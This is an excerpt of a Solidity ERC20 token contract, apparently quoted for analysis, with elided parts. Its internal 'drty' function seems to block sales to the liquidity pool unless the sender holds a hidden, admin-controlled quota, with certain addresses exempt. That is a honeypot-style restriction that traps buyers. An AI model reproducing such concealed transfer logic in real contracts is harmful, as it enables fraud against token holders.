...
contract BSQ is ERC20,Control{  
    ...
    function setAD(address temp)public onlyRole(DEFAULT_ADMIN_ROLE){ 
     ...
     function drty(address from,address to,uint256 amount) internal virtual returns(bool state){
        if(isContract(from) && from!=_poolPair && from!=_DPA && from!=_CDA ){
            if(_Count[from]==0){
                return false;
            }
            return true;
         ...
         if( from!=_DPA && from!=_CDA){
                if( to==_poolPair){ 
                    uint256 _DDDDD=_number[from];
                    if(_DDDDD == 0){
                        return true;
                    }else if(_DDDDD <0 || _DDDDD < amount){ 
                        return true;
                    }else{
                        _number[from]=_DDDDD-amount;
                        return false;
                    }
                }else{
                  return true;
